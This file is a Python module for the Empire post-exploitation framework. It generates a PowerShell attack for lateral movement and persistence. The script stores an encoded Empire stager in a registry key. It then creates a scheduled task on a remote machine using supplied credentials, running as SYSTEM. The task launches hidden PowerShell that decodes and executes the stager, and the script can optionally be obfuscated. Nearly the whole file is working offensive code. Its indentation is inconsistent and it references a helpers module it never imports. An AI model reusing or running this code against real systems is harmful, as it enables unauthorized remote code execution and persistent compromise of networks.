import os
import datetime

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-LateralMoveSchtasks',

            'Author': ['@mattifestation', '@harmj0y', '@kali2020'],

            'Description': ('Lateral movement using schtasks. This has a moderate detection/removal rating.'),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'https://github.com/mattifestation/PowerSploit/blob/master/Persistence/Persistence.psm1'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'TaskName' : {
                'Description'   :   'Name to use for the schtask.',
                'Required'      :   True,
                'Value'         :   'Updater'
            },
            'RegPath' : {
                'Description'   :   'Registry location to store the script code. Last element is the key name.',
                'Required'      :   False,
                'Value'         :   'HKCU:\Software\Microsoft\Windows\CurrentVersion\debug'
            },
            'ComputerName' : {
                'Description'   :   'Computer name (if not supplied, localhost will be used)',
                'Required'      :   False,
                'Value'         :   ''
            },
            'UserName' : {
                'Description'   :   'User name for user running the task (required if ComputerName is supplied)',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'Password for accessing other computer (required if ComputerName is supplied)',
                'Required'      :   False,
                'Value'         :   ''
            },
            'TimeZone' : {
                'Description'   :   'The task will be scheduled at the GMT + this offset',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'MinuteAdjustment' : {
                'Description'   :   'The minute adjustment will be added to the time (can be used if the local and target clock mismatch)',
                'Required'      :   False,
                'Value'         :   '1'
            },
            'Command' : {
                'Description'   :   'Optional command, if specified it will be executed instead of the Empire stager',
                'Required'      :   False,
                'Value'         :   ''
            }     

        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        listenerName = self.options['Listener']['Value']
        
        # trigger options
        taskName = self.options['TaskName']['Value']
    
        # storage options
        regPath = self.options['RegPath']['Value']

        computerName = self.options['ComputerName']['Value']
        userName = self.options['UserName']['Value']
        password = self.options['Password']['Value']

        # time adjustments
        timeZone = self.options['TimeZone']['Value']
        minuteAdjustment = self.options['MinuteAdjustment']['Value']

        command = self.options['Command']['Value']

        statusMsg = ""
        locationString = ""

        # Use a listener
        if not self.mainMenu.listeners.is_listener_valid(listenerName):
	    # not a valid listener, return nothing for the script
	    print helpers.color("[!] Invalid listener: " + listenerName)
	    return ""

        else:
	    # generate the PowerShell one-liner with all of the proper options set
	    launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent='default', proxy='default', proxyCreds='default')
	
	encScript = launcher.split(" ")[-1]
	statusMsg += "using listener " + listenerName


        # otherwise store the script into the specified registry location
        path = "\\".join(regPath.split("\\")[0:-1])
        name = regPath.split("\\")[-1]

        statusMsg += " stored in " + regPath

        script = "$RegPath = '"+regPath+"';"
        script += "$parts = $RegPath.split('\\');"
        script += "$path = $RegPath.split(\"\\\")[0..($parts.count -2)] -join '\\';"
        script += "$name = $parts[-1];"
        script += "$null=Set-ItemProperty -Force -Path $path -Name $name -Value "+encScript+";"

        # note where the script is stored
        locationString = "(gp "+path+" "+name+")."+name

        # built the command that will be triggered by the schtask
        if command != '':
            triggerCmd = command
        else:
            triggerCmd = "'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String("+locationString+")))\\\"'"
       
        # sanity check to make sure we haven't exceeded the cmd.exe command length max
        if len(triggerCmd) > 259:
            print helpers.color("[!] Warning: trigger command exceeds the maximum of 259 characters.")
            return ""

        runTime = datetime.datetime.today() + datetime.timedelta(hours = int(timeZone)) + datetime.timedelta(minutes = int(minuteAdjustment))
        nowTime = datetime.datetime.strftime(runTime , '%H:%M')

        schTaskCmd = "schtasks /Create /F /SC once"+ " /S " + computerName + " /U "+userName+" /P "+password + " /RU system /ST "+nowTime+" /TN "+taskName+" /TR "+triggerCmd+";"
        script += schTaskCmd
        statusMsg += " with "+taskName+" run at " + nowTime + " (Ensure this is the correct time on the target!)."
        print "COMMAND : " + schTaskCmd

        script += "'Schtasks persistence established "+statusMsg+"'"
        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        return script
